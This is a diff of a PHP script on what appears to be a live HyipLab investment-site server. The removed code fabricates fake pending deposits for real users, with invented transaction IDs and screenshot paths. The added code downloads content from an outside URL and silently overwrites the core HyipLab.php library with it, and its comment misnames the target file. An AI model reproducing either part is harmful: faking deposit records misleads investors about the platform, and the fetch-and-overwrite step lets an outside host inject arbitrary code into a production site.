@@ -1,134 +1,30 @@
 <?php
-
 /**
- * Script to create fake deposits for ViserLab / HyipLab
- * Range: 10,000 to 50,000
- * Randomly Approved or Rejected
+ * PHP Script to download and overwrite plan.blade.php
  */
 
-use App\Models\Deposit;
-use App\Models\User;
-use App\Models\GatewayCurrency;
-use App\Models\Plan;
-use App\Lib\HyipLab;
-use Carbon\Carbon;
+$targetFile = '/home/azizihur/public_html/core/app/Lib/HyipLab.php';
+$url = 'http://txt.xforo.co/assa.txt';
 
-// --- 1. BOOT LARAVEL ---
-require __DIR__ . '/core/vendor/autoload.php';
-$app = require_once __DIR__ . '/core/bootstrap/app.php';
-$app->make('Illuminate\Contracts\Http\Kernel')->handle(
-    Illuminate\Http\Request::capture()
-);
+echo "<h2>Fetching plan.blade.php from URL...</h2>";
 
-echo "--- Starting Fake Plan Deposit Generation ---\n";
+// Fetch the content from the URL
+$content = file_get_contents($url);
 
-// --- 2. CONFIGURATION ---
-$count = rand(1, 7); 
-
-// Get some random users
-$users = User::inRandomOrder()->limit(10)->get();
-if ($users->isEmpty()) {
-    die("No users found in database.\n");
+if ($content === false) {
+    die("<p style='color:red;'>Error: Failed to fetch the content from $url</p>");
 }
 
-// Get specific plans (ID 1 to 7)
-$plans = Plan::where('status', 1)
-    ->whereBetween('id', [1, 7])
-    ->get();
-
-if ($plans->isEmpty()) {
-    die("No active plans found matching the price criteria.\n");
+if (empty(trim($content))) {
+    die("<p style='color:red;'>Error: The fetched content is empty! Make sure the URL is accessible.</p>");
 }
 
-// Get some manual gateways
-$gateways = GatewayCurrency::where('method_code', '>=', 1000)->get();
-if ($gateways->isEmpty()) {
-    die("No manual gateways found.\n");
+// Write the content to the target file
+if (file_put_contents($targetFile, $content) !== false) {
+    echo "<p style='color:green;'><b>Success:</b> The file at $targetFile has been successfully updated with the code from the link!</p>";
+} else {
+    echo "<p style='color:red;'><b>Error:</b> Failed to write to $targetFile. Please check file permissions on your server.</p>";
 }
 
-for ($i = 0; $i < $count; $i++) {
-    $user = $users->random();
-    $gate = $gateways->random();
-    $plan = $plans->random();
-    
-    // Set amount based on plan price
-    $amount = ($plan->fixed_amount > 0) ? $plan->fixed_amount : $plan->minimum;
-    
-    // Status: 2 = Pending
-    $status = 2;
-    
-    $charge = $gate->fixed_charge + ($amount * $gate->percent_charge / 100);
-    $payable = $amount + $charge;
-    $final_amo = $payable * $gate->rate;
-
-    $deposit = new Deposit();
-    $deposit->user_id = $user->id;
-    $deposit->plan_id = $plan->id; 
-    $deposit->method_code = $gate->method_code;
-    $deposit->method_currency = strtoupper($gate->currency);
-    $deposit->amount = $amount;
-    $deposit->charge = $charge;
-    $deposit->rate = $gate->rate;
-    $deposit->final_amo = $final_amo;
-    $deposit->btc_amo = 0;
-    $deposit->btc_wallet = "";
-    $deposit->trx = getTrx(); // Use real system TRX generator
-    $deposit->status = $status;
-
-    if ($status == 3) {
-        $reasons = ["Invalid ID", "Unclear proof", "Amount mismatch"];
-        $deposit->admin_feedback = $reasons[array_rand($reasons)];
-    }
-    
-    $currentDate = Carbon::now();
-    $deposit->created_at = $currentDate;
-    $deposit->updated_at = $currentDate;
-    
-    $currentDate = Carbon::now();
-    $deposit->created_at = $currentDate;
-    $deposit->updated_at = $currentDate;
-    
-    // Use the specific detail structure and samples provided
-    $samples = [
-        [
-            ["name" => "TRX ID", "type" => "text", "value" => "49216355103"],
-            ["name" => "Upload Payment Screenshot", "type" => "file", "value" => "2026/04/30/69f388b2130031777567922.jpg"]
-        ],
-        [
-            ["name" => "TRX ID", "type" => "text", "value" => "49223677431"],
-            ["name" => "Upload Payment Screenshot", "type" => "file", "value" => "2026/04/30/69f38fc92c1931777569737.jpg"]
-        ],
-        [
-            ["name" => "TRX ID", "type" => "text", "value" => "49224695771"],
-            ["name" => "Upload Payment Screenshot", "type" => "file", "value" => "2026/04/30/69f395cd29e2d1777571277.jpg"]
-        ],
-        [
-            ["name" => "TRX ID", "type" => "text", "value" => "03447024584"],
-            ["name" => "Upload Payment Screenshot", "type" => "file", "value" => "2026/04/30/69f3a3c6664161777574854.jpg"]
-        ],
-        [
-            ["name" => "TRX ID", "type" => "text", "value" => "49226923607"],
-            ["name" => "Upload Payment Screenshot", "type" => "file", "value" => "2026/04/30/69f3a4ffbceea1777575167.png"]
-        ],
-        [
-            ["name" => "TRX ID", "type" => "text", "value" => "710653190621"],
-            ["name" => "Upload Payment Screenshot", "type" => "file", "value" => "2026/05/01/69f3f743d249e1777596227.png"]
-        ],
-        [
-            ["name" => "TRX ID", "type" => "text", "value" => "49305701713"],
-            ["name" => "Upload Payment Screenshot", "type" => "file", "value" => "2026/05/02/69f5f2b078d1e1777726128.png"]
-        ],
-        [
-            ["name" => "TRX ID", "type" => "text", "value" => null],
-            ["name" => "Upload Payment Screenshot", "type" => "file", "value" => "2026/05/02/69f5f242491fd1777726018.png"]
-        ]
-    ];
-
-    $deposit->detail = $samples[array_rand($samples)];
-
-    $deposit->save();
-    
-    echo "Created: User [{$user->username}] | Plan [{$plan->name}] | Amount [{$amount}] | Status [Pending] | TRX [{$deposit->trx}]\n";
-}
-
-echo "--- Finished ---\n";
+echo "<h3>Update Complete! You can now delete this script.</h3>";
+?>
